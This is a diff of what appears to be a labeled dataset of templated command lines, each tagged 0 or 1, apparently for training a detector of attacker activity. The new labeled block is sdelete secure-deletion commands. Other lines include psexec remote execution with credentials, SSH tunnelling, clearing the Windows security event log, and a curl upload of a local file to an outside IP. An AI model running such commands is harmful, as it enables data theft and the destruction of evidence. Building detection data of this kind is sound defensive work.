@@ -1,16 +1,16 @@
-1	cmd /c "7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}"
-1	7z a -slt ${destination_file_path} ${source_file_path} -p${password}
-1	cmd /c "7z a -slt ${destination_file_path} ${source_file_path} -p${password}"
-1	powershell -c "7z a -slt ${destination_file_path} ${source_file_path} -p${password}"
-1	7z.exe a -slt ${destination_file_path} ${source_file_path} -p${password}
-1	cmd /c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p${password}"
-1	powershell -c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p${password}"
-0	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-0	psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-0	hostname.exe
-0	cmd /c "ipconfig.exe /allcompartments /all"
-0	psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-0	netstat -r
-0	plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-0	rm -rf ${local_file_path}
+1	cmd /c "sdelete.exe -f -q ${local_file_path}"
+1	powershell -c "sdelete.exe -f -q ${local_file_path}"
+1	sdelete -f -q -accepteula ${local_file_path}
+1	cmd /c "sdelete -f -q -accepteula ${loal_file_path}"
+1	powershell -c "sdelete -f -q -accepteula ${local_file_path}"
+1	sdelete.exe -f -q -accepteula ${local_file_path}
+1	cmd /c "sdelete.exe -f -q -accepteula ${local_file_path}"
+1	powershell -c "sdelete.exe -f -q -accepteula ${local_file_path}"
+0	cmd /c "wmic.exe shadowcopy call create Volume=C:"
+0	del /q ${local_file_path}
+0	7z a ${destination_file_path} ${source_file_path} -p
+0	cat email.txt | mailx -s ${email_subject} ${username}@${domain} 2> /dev/null
+0	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> error.log
+0	cmd /c "wevtutil.exe clear-log security"
+0	mail -s ${email_subject} ${username}@${domain} < mail.txt
+0	cmd /c "curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload"
